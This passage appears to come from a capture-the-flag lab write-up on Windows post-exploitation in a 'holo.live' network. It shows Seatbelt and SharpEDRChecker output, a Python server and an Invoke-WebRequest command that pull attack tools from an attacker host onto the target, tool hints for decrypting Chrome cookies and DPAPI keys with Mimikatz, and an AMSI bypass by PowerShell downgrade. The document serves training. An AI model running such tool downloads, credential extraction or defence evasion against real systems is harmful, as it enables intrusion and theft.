+CurrentUser\Root - 2796BAE63F1801E277261BA0D77770028F20EEE4 (Go Daddy Class 2 Certification Authority) 6/29/2034 5:06:20 PM
+CurrentUser\Root - 07E032E020B72C3F192F0628A2593A19A70F069E (Certum Trusted Network CA) 12/31/2029 12:07:37 PM
+CurrentUser\Root - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/10/2031 12:00:00 AM
+LocalMachine\Root - 92B46C76E13054E104F230517E6E504D43AB10B5 (Symantec Enterprise Mobile Root for Microsoft) 3/14/2032 11:59:59 PM
+LocalMachine\Root - 8F43288AD272F3103B6FB1428485EA3014C0BCFE (Microsoft Root Certificate Authority 2011) 3/22/2036 10:13:04 PM
+LocalMachine\Root - 3B1EFD3A66EA28B16697394703A72CA340A05BD5 (Microsoft Root Certificate Authority 2010) 6/23/2035 10:04:01 PM
+LocalMachine\Root - 31F9FC8BA3805986B721EA7295C65B3A44534274 (Microsoft ECC TS Root Certificate Authority 2018) 2/27/2043 9:00:12 PM
+LocalMachine\Root - 06F1AA330B927B753A40E68CDF22E34BCBEF3352 (Microsoft ECC Product Root Certificate Authority 2018) 2/27/2043 8:50:46 PM
+LocalMachine\Root - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 12:00:00 PM
+LocalMachine\Root - DDFB16CD4931C973A2037D3FC83A4D7D775D05E4 (DigiCert Trusted Root G4) 1/15/2038 12:00:00 PM
+LocalMachine\Root - D4DE20D05E66FC53FE1A50882C78DB2852CAE474 (Baltimore CyberTrust Root) 5/12/2025 11:59:00 PM
+LocalMachine\Root - D1EB23A46D17D68FD92564C2F1F1601764D8E349 (AAA Certificate Services) 12/31/2028 11:59:59 PM
+LocalMachine\Root - B1BC968BD4F49D622AA89A81F2150152A41D829C (GlobalSign Root CA) 1/28/2028 12:00:00 PM
+LocalMachine\Root - AFE5D244A8D1194230FF479FE2F897BBCD7A8CB4 (COMODO RSA Certification Authority) 1/18/2038 11:59:59 PM
+LocalMachine\Root - AD7E1C28B064EF8F6003402014C3D0E3370EB58A (Starfield Class 2 Certification Authority) 6/29/2034 5:39:16 PM
+LocalMachine\Root - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/10/2031 12:00:00 AM
+LocalMachine\Root - 8782C6C304353BCFD29692D2593E7D44D934FF11 (SecureTrust CA) 12/31/2029 7:40:55 PM
+LocalMachine\Root - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 11:59:59 PM
+LocalMachine\Root - 5FB7EE0633E259DBAD0C4C9AE6D38F1A61C7DC25 (DigiCert High Assurance EV Root CA) 11/10/2031 12:00:00 AM
+LocalMachine\Root - 4EB6D578499B1CCF5F581EAD56BE3D9B6744A5E5 (VeriSign Class 3 Public Primary Certification Authority - G5) 7/16/2036 11:59:59 PM
+LocalMachine\Root - 3679CA35668772304D30A5FB873B0FA77BB70D54 (VeriSign Universal Root Certification Authority) 12/1/2037 11:59:59 PM
+LocalMachine\Root - 2B8F1B57330DBBA2D07A6C51F70EE90DDAB9AD8E (USERTrust RSA Certification Authority) 1/18/2038 11:59:59 PM
+LocalMachine\Root - 2796BAE63F1801E277261BA0D77770028F20EEE4 (Go Daddy Class 2 Certification Authority) 6/29/2034 5:06:20 PM
+LocalMachine\Root - 07E032E020B72C3F192F0628A2593A19A70F069E (Certum Trusted Network CA) 12/31/2029 12:07:37 PM
+LocalMachine\Root - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/10/2031 12:00:00 AM
+CurrentUser\CertificateAuthority - FEE449EE0E3965A5246F000E87FDE2A065FD89D4 (Root Agency) 12/31/2039 11:59:59 PM
+LocalMachine\CertificateAuthority - FEE449EE0E3965A5246F000E87FDE2A065FD89D4 (Root Agency) 12/31/2039 11:59:59 PM
+CurrentUser\AuthRoot - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 12:00:00 PM
+CurrentUser\AuthRoot - DDFB16CD4931C973A2037D3FC83A4D7D775D05E4 (DigiCert Trusted Root G4) 1/15/2038 12:00:00 PM
+CurrentUser\AuthRoot - D4DE20D05E66FC53FE1A50882C78DB2852CAE474 (Baltimore CyberTrust Root) 5/12/2025 11:59:00 PM
+CurrentUser\AuthRoot - D1EB23A46D17D68FD92564C2F1F1601764D8E349 (AAA Certificate Services) 12/31/2028 11:59:59 PM
+CurrentUser\AuthRoot - B1BC968BD4F49D622AA89A81F2150152A41D829C (GlobalSign Root CA) 1/28/2028 12:00:00 PM
+CurrentUser\AuthRoot - AFE5D244A8D1194230FF479FE2F897BBCD7A8CB4 (COMODO RSA Certification Authority) 1/18/2038 11:59:59 PM
+CurrentUser\AuthRoot - AD7E1C28B064EF8F6003402014C3D0E3370EB58A (Starfield Class 2 Certification Authority) 6/29/2034 5:39:16 PM
+CurrentUser\AuthRoot - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/10/2031 12:00:00 AM
+CurrentUser\AuthRoot - 8782C6C304353BCFD29692D2593E7D44D934FF11 (SecureTrust CA) 12/31/2029 7:40:55 PM
+CurrentUser\AuthRoot - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 11:59:59 PM
+CurrentUser\AuthRoot - 5FB7EE0633E259DBAD0C4C9AE6D38F1A61C7DC25 (DigiCert High Assurance EV Root CA) 11/10/2031 12:00:00 AM
+CurrentUser\AuthRoot - 4EB6D578499B1CCF5F581EAD56BE3D9B6744A5E5 (VeriSign Class 3 Public Primary Certification Authority - G5) 7/16/2036 11:59:59 PM
+CurrentUser\AuthRoot - 3679CA35668772304D30A5FB873B0FA77BB70D54 (VeriSign Universal Root Certification Authority) 12/1/2037 11:59:59 PM
+CurrentUser\AuthRoot - 2B8F1B57330DBBA2D07A6C51F70EE90DDAB9AD8E (USERTrust RSA Certification Authority) 1/18/2038 11:59:59 PM
+CurrentUser\AuthRoot - 2796BAE63F1801E277261BA0D77770028F20EEE4 (Go Daddy Class 2 Certification Authority) 6/29/2034 5:06:20 PM
+CurrentUser\AuthRoot - 07E032E020B72C3F192F0628A2593A19A70F069E (Certum Trusted Network CA) 12/31/2029 12:07:37 PM
+CurrentUser\AuthRoot - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/10/2031 12:00:00 AM
+LocalMachine\AuthRoot - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 12:00:00 PM
+LocalMachine\AuthRoot - DDFB16CD4931C973A2037D3FC83A4D7D775D05E4 (DigiCert Trusted Root G4) 1/15/2038 12:00:00 PM
+LocalMachine\AuthRoot - D4DE20D05E66FC53FE1A50882C78DB2852CAE474 (Baltimore CyberTrust Root) 5/12/2025 11:59:00 PM
+LocalMachine\AuthRoot - D1EB23A46D17D68FD92564C2F1F1601764D8E349 (AAA Certificate Services) 12/31/2028 11:59:59 PM
+LocalMachine\AuthRoot - B1BC968BD4F49D622AA89A81F2150152A41D829C (GlobalSign Root CA) 1/28/2028 12:00:00 PM
+LocalMachine\AuthRoot - AFE5D244A8D1194230FF479FE2F897BBCD7A8CB4 (COMODO RSA Certification Authority) 1/18/2038 11:59:59 PM
+LocalMachine\AuthRoot - AD7E1C28B064EF8F6003402014C3D0E3370EB58A (Starfield Class 2 Certification Authority) 6/29/2034 5:39:16 PM
+LocalMachine\AuthRoot - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/10/2031 12:00:00 AM
+LocalMachine\AuthRoot - 8782C6C304353BCFD29692D2593E7D44D934FF11 (SecureTrust CA) 12/31/2029 7:40:55 PM
+LocalMachine\AuthRoot - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 11:59:59 PM
+LocalMachine\AuthRoot - 5FB7EE0633E259DBAD0C4C9AE6D38F1A61C7DC25 (DigiCert High Assurance EV Root CA) 11/10/2031 12:00:00 AM
+LocalMachine\AuthRoot - 4EB6D578499B1CCF5F581EAD56BE3D9B6744A5E5 (VeriSign Class 3 Public Primary Certification Authority - G5) 7/16/2036 11:59:59 PM
+LocalMachine\AuthRoot - 3679CA35668772304D30A5FB873B0FA77BB70D54 (VeriSign Universal Root Certification Authority) 12/1/2037 11:59:59 PM
+LocalMachine\AuthRoot - 2B8F1B57330DBBA2D07A6C51F70EE90DDAB9AD8E (USERTrust RSA Certification Authority) 1/18/2038 11:59:59 PM
+LocalMachine\AuthRoot - 2796BAE63F1801E277261BA0D77770028F20EEE4 (Go Daddy Class 2 Certification Authority) 6/29/2034 5:06:20 PM
+LocalMachine\AuthRoot - 07E032E020B72C3F192F0628A2593A19A70F069E (Certum Trusted Network CA) 12/31/2029 12:07:37 PM
+LocalMachine\AuthRoot - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/10/2031 12:00:00 AM
+====== ChromiumBookmarks ======
+
+====== ChromiumHistory ======
+
+History (C:\Users\watamet\AppData\Local\Google\Chrome\User Data\Default\History):
+
+  https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+  https://github.com/PowerShellMafia/PowerSploit/raw/master/Recon/PowerView.ps1
+  https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1PowerSploit/PowerView.ps1
+  https://github.com/PowerShellMafia/PowerSploit/tree/master/ReconPowerSploit/Recon
+  https://www.google.com/search?q=powrview+powersploit&rlz=1C1GCEU_enIE947IE947&oq=powrview+powersploit&aqs=chrome..69i57j46i13j0i13l2j46i13i175i199j0i13l4.5039j0j7&sourceid=chrome&ie=UTF-8powrview
+  https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exeGhostpack-CompiledBinaries/Seatbelt.exe
+  https://github.com/r3motecontrol/Ghostpack-CompiledBinariesGitHub
+  https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exehttps://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exehttps://www.google.com/application/octet-streamapplication/octet-stream
+  https://docs.microsoft.com/https://docs.microsoft.com/en-us/sysinternals/downloads/procmonhttps://www.google.com/0x8D85B683CB77195Fri
+  https://raw.githubusercontent.com/r3motecontrol/Ghostpack-CompiledBinaries/master/Seatbelt.exeY
+  https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+  https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
+  https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe
+  https://www.google.com/search?q=precompiled+seatbelt&oq=precompiled+seatbelt&aqs=chrome..69i57j0i10i22i30.2518j0j7&sourceid=chrome&ie=UTF-8
+
+====== ChromiumPresence ======
+
+  C:\Users\watamet\AppData\Local\Google\Chrome\User Data\Default\
+
+    'History'     (4/7/2021 2:22:28 AM)  :  Run the 'ChromiumHistory' command
+    'Cookies'     (4/7/2021 2:22:34 AM)  :  Run SharpDPAPI/SharpChrome or the Mimikatz "dpapi::chrome" module
+     Chrome Version                       :  96.0.4664.110
+====== CloudCredentials ======
+
+====== CloudSyncProviders ======
+
+====== CredEnum ======
+
+ERROR:   [!] Terminating exception running command 'CredEnum': System.ComponentModel.Win32Exception (0x80004005): Element not found
+   at Seatbelt.Commands.Windows.CredEnumCommand.<Execute>d__9.MoveNext()
+   at Seatbelt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
+====== CredGuard ======
+
+====== dir ======
+
+  LastAccess LastWrite  Size      Path
+
+  21-04-07   21-04-07   772.7KB   C:\Users\watamet\Downloads\PowerView.ps1
+  20-12-25   20-12-25   2MB       C:\Users\watamet\Downloads\ProcessMonitor.zip
+  21-04-02   21-04-02   531.5KB   C:\Users\watamet\Downloads\Seatbelt.exe
+  20-12-12   20-12-12   0B        C:\Users\watamet\Documents\My Music\
+  20-12-12   20-12-12   0B        C:\Users\watamet\Documents\My Pictures\
+  20-12-12   20-12-12   0B        C:\Users\watamet\Documents\My Videos\
+  23-02-07   23-02-07   1.1KB     C:\Users\watamet\Desktop\applocker-bypass-checker.ps1
+  23-02-07   23-02-07   1.1KB     C:\Users\watamet\Desktop\applocker-bypass-checker.txt
+  23-02-07   23-02-07   35.3KB    C:\Users\watamet\Desktop\output.txt
+  21-03-16   21-03-16   38B       C:\Users\watamet\Desktop\user.txt
+  18-11-14   18-11-14   0B        C:\Users\Public\Documents\My Music\
+  18-11-14   18-11-14   0B        C:\Users\Public\Documents\My Pictures\
+  18-11-14   18-11-14   0B        C:\Users\Public\Documents\My Videos\
+  21-12-16   21-12-16   2.2KB     C:\Users\Public\Desktop\Google Chrome.lnk
+  18-11-14   18-11-14   0B        C:\Users\Default\Documents\My Music\
+  18-11-14   18-11-14   0B        C:\Users\Default\Documents\My Pictures\
+  18-11-14   18-11-14   0B        C:\Users\Default\Documents\My Videos\
+  16-06-21   20-11-15   527B      C:\Users\Default\Desktop\EC2 Feedback.website
+  16-06-21   20-11-15   554B      C:\Users\Default\Desktop\EC2 Microsoft Windows Guide.website
+====== DNSCache ======
+
+  Entry                          : dc-srv01.holo.live
+  Name                           : dc-srv01.holo.live
+  Data                           : 10.200.95.30
+
+  Entry                          : _ldap._tcp.default-first-site-name._sites.forestdnszones.holo.live
+  Name                           : _ldap._tcp.Default-First-Site-Name._sites.ForestDnsZones.holo.live
+  Data                           : dc-srv01.holo.live 0 100 389
+
+  Entry                          : _ldap._tcp.default-first-site-name._sites.forestdnszones.holo.live
+  Name                           : dc-srv01.holo.live
+  Data                           : 10.200.95.30
+
+  Entry                          : _ldap._tcp.default-first-site-name._sites.domaindnszones.holo.live
+  Name                           : _ldap._tcp.Default-First-Site-Name._sites.DomainDnsZones.holo.live
+  Data                           : dc-srv01.holo.live 0 100 389
+
+  Entry                          : _ldap._tcp.default-first-site-name._sites.domaindnszones.holo.live
+  Name                           : dc-srv01.holo.live
+  Data                           : 10.200.95.30
+
+====== DotNet ======
+
+  Installed CLR Versions
+      4.0.30319
+
+  Installed .NET Versions
+      4.7.03190
+
+  Anti-Malware Scan Interface (AMSI)
+      OS supports AMSI           : True
+     .NET version support AMSI   : False
+====== DpapiMasterKeys ======
+
+  Folder : C:\Users\watamet\AppData\Roaming\Microsoft\Protect\S-1-5-21-471847105-3603022926-1728018720-1132
+
+    LastAccessed              LastModified              FileName
+    ------------              ------------              --------
+    2/7/2023 1:51:33 AM       2/7/2023 1:51:33 AM       497fa1d0-a968-4fa3-8d75-ca0f7048764b
+    4/2/2021 10:36:54 PM      4/2/2021 10:36:54 PM      c99e38c1-f897-4a74-8c26-54b42f797326
+    4/2/2021 10:28:39 PM      4/2/2021 10:28:39 PM      fa11aa6c-342d-43b4-a166-75548290dd00
+    7/15/2021 5:00:56 PM      7/15/2021 5:00:56 PM      fcd5d784-f95c-40a4-9605-f84e0d4cb476
+
+  [*] Use the Mimikatz "dpapi::masterkey" module with appropriate arguments (/pvk or /rpc) to decrypt
+  [*] You can also extract many DPAPI masterkeys from memory with the Mimikatz "sekurlsa::dpapi" module
+  [*] You can also use SharpDPAPI for masterkey retrieval.
+====== Dsregcmd ======
+====== PowerShell ======
+
+  Installed CLR Versions
+      4.0.30319
+
+  Installed PowerShell Versions
+      2.0
+        [!] Version 2.0.50727 of the CLR is not installed - PowerShell v2.0 won't be able to run.
+      5.1.17763.1
+
+  Transcription Logging Settings
+      Enabled            : False
+      Invocation Logging : False
+      Log Directory      : 
+
+  Module Logging Settings
+      Enabled             : False
+      Logged Module Names :
+
+  Script Block Logging Settings
+      Enabled            : False
+      Invocation Logging : False
+
+  Anti-Malware Scan Interface (AMSI)
+      OS Supports AMSI: True
+        [!] You can do a PowerShell version downgrade to bypass AMSI.
+ 
+====== FileInfo ======
+
+  Comments                       : 
+  CompanyName                    : Microsoft Corporation
+  FileDescription                : NT Kernel & System
+  FileName                       : C:\Windows\system32\ntoskrnl.exe
+  FileVersion                    : 10.0.17763.1577 (WinBuild.160101.0800)
+  InternalName                   : ntkrnlmp.exe
+  IsDebug                        : False
+  IsDotNet                       : False
+  IsPatched                      : False
+  IsPreRelease                   : False
+  IsPrivateBuild                 : False
+  IsSpecialBuild                 : False
+  Language                       : English (United States)
+  LegalCopyright                 : c Microsoft Corporation. All rights reserved.
+  LegalTrademarks                : 
+  OriginalFilename               : ntkrnlmp.exe
+  PrivateBuild                   : 
+  ProductName                    : Microsoftr Windowsr Operating System
+  ProductVersion                 : 10.0.17763.1577
+  SpecialBuild                   : 
+  Attributes                     : Archive
+  CreationTimeUtc                : 11/11/2020 4:39:01 AM
+  LastAccessTimeUtc              : 11/11/2020 4:39:02 AM
+  LastWriteTimeUtc               : 11/11/2020 4:39:02 AM
+  Length                         : 9662272
+  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-22
+
+└─$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.200.95.35 - - [06/Feb/2023 20:54:14] "GET /Seatbelt.exe HTTP/1.1" 200 -
+10.200.95.35 - - [06/Feb/2023 21:18:02] "GET /SharpEDRChecker.exe HTTP/1.1" 200 -
+
+PS C:\Windows\Tasks> Invoke-WebRequest http://10.50.74.15:8000/SharpEDRChecker.exe -outfile C:\Windows\Tasks\SharpEDRChecker.exe
+
+PS C:\Windows\Tasks> .\SharpEDRChecker.exe
+
+###################################################################################################
+                    [!][!][!] Welcome to SharpEDRChecker by @PwnDexter [!][!][!]
+[-][-][-] Not running as admin, some privileged metadata and processes may not be checked [-][-][-]
+###################################################################################################
+
+######################################
+[!][!][!] Checking processes [!][!][!]
+######################################
+
+[-] Suspicious process found:
+        Name: MsMpEng.exe
+        Description: MsMpEng.exe
+        Caption: MsMpEng.exe
+        Binary:
+        Process ID: 2376
+        Parent Process: 732
+        Process CmdLine:
+        File Metadata:
+[!] Matched on: msmpeng
+
+###################################################################
+[!][!][!] Checking modules loaded in your current process [!][!][!]
+###################################################################
+
+[+] No suspicious modules found in your process
+
+########################################
+[!][!][!] Checking Directories [!][!][!]
+########################################
+
+[-] Suspicious directory found: C:\Program Files\Windows Defender
+[!] Matched on: defender
+
+[-] Suspicious directory found: C:\Program Files\Windows Defender Advanced Threat Protection
+[!] Matched on: defender, threat
+
+[-] Suspicious directory found: C:\Program Files\Wireshark
+[!] Matched on: wireshark
+
+[-] Suspicious directory found: C:\Program Files (x86)\Windows Defender
+[!] Matched on: defender
+
+#####################################
+[!][!][!] Checking Services [!][!][!]
+#####################################
+
+[-] Suspicious service found:
+        Name: mpssvc
+        DisplayName: Windows Defender Firewall
+        Description: Windows Defender Firewall helps protect your computer by preventing unauthorized users from gaining access to your computer through the Internet or a network.
+        Caption: Windows Defender Firewall
+        Binary: C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p
+        Status: Running
+        Process ID: 1520
+        File Metadata:
+                 Product Name: Microsoftr Windowsr Operating System
+                 Filename: C:\Windows\system32\svchost.exe
+                 Original Filename: svchost.exe.mui
+                 Internal Name: svchost.exe
+                 Company Name: Microsoft Corporation
+                 File Description: Host Process for Windows Services
+                 Product Version: 10.0.17763.1
+                 Comments:
+                 Legal Copyright: c Microsoft Corporation. All rights reserved.
+                 Legal Trademarks:
+[!] Matched on: defender
+
+[-] Suspicious service found:
+        Name: PolicyAgent
+        DisplayName: IPsec Policy Agent
+        Description: Internet Protocol security (IPsec) supports network-level peer authentication, data origin authentication, data integrity, data confidentiality (encryption), and replay protection.  This service enforces IPsec policies created through the IP Security Policies snap-in or the command-line tool "netsh ipsec".  If you stop this service, you may experience network connectivity issues if your policy requires that connections use IPsec.  Also,remote management of Windows Defender Firewall is not available when this service is stopped.
+        Caption: IPsec Policy Agent
+        Binary: C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted -p
+        Status: Running
+        Process ID: 2008
+        File Metadata:
+                 Product Name: Microsoftr Windowsr Operating System
+                 Filename: C:\Windows\system32\svchost.exe
+                 Original Filename: svchost.exe.mui
+                 Internal Name: svchost.exe
+                 Company Name: Microsoft Corporation
+                 File Description: Host Process for Windows Services
+                 Product Version: 10.0.17763.1
+                 Comments:
+                 Legal Copyright: c Microsoft Corporation. All rights reserved.
+                 Legal Trademarks:
+[!] Matched on: defender
+
+[-] Suspicious service found:
+        Name: SecurityHealthService
+        DisplayName: Windows Security Service
+        Description: Windows Security Service handles unified device protection and health information
+        Caption: Windows Security Service
+        Binary: C:\Windows\system32\SecurityHealthService.exe
+        Status: Stopped
+        Process ID: 0
+        File Metadata:
+                 Product Name: Microsoftr Windowsr Operating System
+                 Filename: C:\Windows\system32\SecurityHealthService.exe
+                 Original Filename: SecurityHealthService.exe
+                 Internal Name: SecurityHealthService
+                 Company Name: Microsoft Corporation
+                 File Description: Windows Security Health Service
+                 Product Version: 4.18.1807.16384
+                 Comments:
+                 Legal Copyright: c Microsoft Corporation. All rights reserved.
+                 Legal Trademarks:
+[!] Matched on: securityhealthservice
+
+[-] Suspicious service found:
+        Name: Sense
+        DisplayName: Windows Defender Advanced Threat Protection Service
+        Description: Windows Defender Advanced Threat Protection service helps protect against advanced threats by monitoring and reporting security events that happen on the computer.
+        Caption: Windows Defender Advanced Threat Protection Service
+        Binary: "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"
+        Status: Stopped
+        Process ID: 0
+        File Metadata:
+                 Product Name: Microsoftr Windowsr Operating System
+                 Filename: C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe
+                 Original Filename: MsSense.exe.mui
+                 Internal Name: MsSense.exe
+                 Company Name: Microsoft Corporation
+                 File Description: Windows Defender Advanced Threat Protection Service Executable
+                 Product Version: 10.7410.17763.1369
+                 Comments:
+                 Legal Copyright: c Microsoft Corporation. All rights reserved.
+                 Legal Trademarks:
+[!] Matched on: defender, threat
+
+[-] Suspicious service found:
+        Name: WdNisSvc
+        DisplayName: Windows Defender Antivirus Network Inspection Service
+        Description: Helps guard against intrusion attempts targeting known and newly discovered vulnerabilities in network protocols
+        Caption: Windows Defender Antivirus Network Inspection Service
+        Binary: "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2111.5-0\NisSrv.exe"
+        Status: Stopped
+        Process ID: 0
+        File Metadata:
+                 Product Name: Microsoftr Windowsr Operating System
+                 Filename: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2111.5-0\NisSrv.exe
+                 Original Filename: NisSrv.exe
+                 Internal Name: NisSrv.exe
+                 Company Name: Microsoft Corporation
+                 File Description: Microsoft Network Realtime Inspection Service
+                 Product Version: 4.18.2111.5
+                 Comments:
+                 Legal Copyright: c Microsoft Corporation. All rights reserved.
+                 Legal Trademarks:
+[!] Matched on: antivirus, defender, nissrv
+
+[-] Suspicious service found:
+        Name: WinDefend
+        DisplayName: Windows Defender Antivirus Service
+        Description: Helps protect users from malware and other potentially unwanted software
+        Caption: Windows Defender Antivirus Service
+        Binary: "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2111.5-0\MsMpEng.exe"
+        Status: Running
+        Process ID: 2376
+        File Metadata:
+                 Product Name: Microsoftr Windowsr Operating System
+                 Filename: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2111.5-0\MsMpEng.exe
+                 Original Filename: MsMpEng.exe
+                 Internal Name: MsMpEng.exe
+                 Company Name: Microsoft Corporation
+                 File Description: Antimalware Service Executable
+                 Product Version: 4.18.2111.5
+                 Comments:
+                 Legal Copyright: c Microsoft Corporation. All rights reserved.
+                 Legal Trademarks:
+[!] Matched on: antimalware, antivirus, defender, malware, msmpeng
+
+####################################
+[!][!][!] Checking drivers [!][!][!]
+####################################
+
+[-] Suspicious driver found:
+        Suspicious Module: WdFilter.sys
+        File Metadata:
+                 Product Name: Microsoftr Windowsr Operating System
+                 Filename: c:\windows\system32\drivers\wd\wdfilter.sys
+                 Original Filename: WdFilter.sys
+                 Internal Name: WdFilter
+                 Company Name: Microsoft Corporation
+                 File Description: Microsoft antimalware file system filter driver
+                 Product Version: 4.18.2111.5
+                 Comments:
+                 Legal Copyright: c Microsoft Corporation. All rights reserved.
+                 Legal Trademarks:
+[!] Matched on: antimalware, malware
+
+[!] Could not get file info for: c:\Windows\Sysnative\drivers\dump_diskdump.sys
+
+[!] Could not get file info for: c:\Windows\Sysnative\drivers\dump_xenvbd.sys
+
+[!] Could not get file info for: c:\Windows\Sysnative\drivers\dump_xencrsh.sys
+
+################################
+[!][!][!] TLDR Summary [!][!][!]
+################################
+
+[!] Process Summary:
+        [-] MsMpEng.exe : msmpeng
+
+[+] No suspicious modules found in your process
+
+[!] Directory Summary:
+        [-] C:\Program Files\Windows Defender : defender
+        [-] C:\Program Files\Windows Defender Advanced Threat Protection : defender, threat
+        [-] C:\Program Files\Wireshark : wireshark
+        [-] C:\Program Files (x86)\Windows Defender : defender
+
+[!] Service Summary:
+        [-] mpssvc : defender
+        [-] PolicyAgent : defender
+        [-] SecurityHealthService : securityhealthservice
+        [-] Sense : defender, threat
+        [-] WdNisSvc : antivirus, defender, nissrv
+        [-] WinDefend : antimalware, antivirus, defender, malware, msmpeng
+
+[!] Driver Summary:
+        [-] WdFilter.sys : antimalware, malware
+
+#######################################
+[!][!][!] EDR Checks Complete [!][!][!]
+#######################################
+```
+Read the above and attempt to identify defensive products on PC-FILESRV01.
+Completed
+What anti-malware product is employed on PC-FILESRV01?
+Found in modload.
+*AMSI*
+What anti-virus product is employed on PC-FILESRV01?
+Found in almost all checks.
+*Windows Defender*
+### Situational Awareness SEATBELT CHECK!
+Now that we understand the system's detection measures and what we can and can't do in our attack surface, we can begin moving on to system enumeration. This type of enumeration can help us identify the endpoint's surface better and potential areas for privilege escalation. To allow us to enumerate the endpoint, we will again be utilizing Seatbelt.
+As previously mentioned, Seatbelt is an enumeration tool that will perform many system checks and provide information on an endpoint. This time we will be using all of the modules that Seatbelt has to offer.
+Find a quick overview of some of the essential modules below.
+-   `DotNet` Retrieves .NET version
+-   `LocalGPOs` Finds local group policies applied to machine and local users
+-   `LocalGroups` Lists non-empty local groups
+-   `NetworkShares` Lists exposed network shares
+-   `PowerShell` Retrieves PowerShell version and security settings
+-   `Processes` Lists running processes
+-   `TokenPrivileges` Lists enabled token privileges (SeDebug)
+-   `CredEnum` Lists current user's saved credentials
+-   `InterestingFiles` Interesting files matching patterns in user folder
+-   `ScheduledTasks` Scheduled tasks not authored by Microsoft.
+Some of the above tasks will require privileges or a desktop session to run. Using Seatbelt for low privileged awareness uses the basic information you can get to identify the system surface.
+These are not nearly all of the modules that Seatbelt has to offer. For more information about all of the modules Seatbelt offers, check out the GitHub readme, [https://github.com/GhostPack/Seatbelt#command-groups](https://github.com/GhostPack/Seatbelt#command-groups)
+Find syntax and an example of output below.
+Syntax: `.\Seatbelt.exe all`
+![](https://i.imgur.com/ZYWXGrg.png)
+We can also run Seatbelt from Covenant using the Seatbelt module found below.
+Module: `Seatbelt`
+You will notice that Seatbelt produces a large amount of output. It can be helpful to save this output to a file to comb through later. You will have to spend a little bit of time searching through the output to get all the information you need on the endpoint.
+For more information about Seatbelt, check out the Seatbelt GitHub page, [https://github.com/GhostPack/Seatbelt#table-of-contents](https://github.com/GhostPack/Seatbelt#table-of-contents).
+Answer the questions below
+```text
+PS C:\Windows\Tasks> .\Seatbelt.exe all
+
+                        %&&@@@&&
+                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
+                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
+%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
+#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
+#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
+#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
+#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
+###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
+#####%######################  %%%..                       @////(((&%%%%%%%################
+                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
+                        &%%&&&%%%%%        v1.2.1         ,(((&%%%%%%%%%%%%%%%%%,
+                         #%%%%##,
+
+ERROR: Error running command "all"
+
+[*] Completed collection in 0.009 seconds
+
+PS C:\Windows\Tasks> .\Seatbelt.exe -all
+
+                        %&&@@@&&
+                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
+                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
+%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
+#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
+#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
+#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
+#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
+###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
+#####%######################  %%%..                       @////(((&%%%%%%%################
+                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
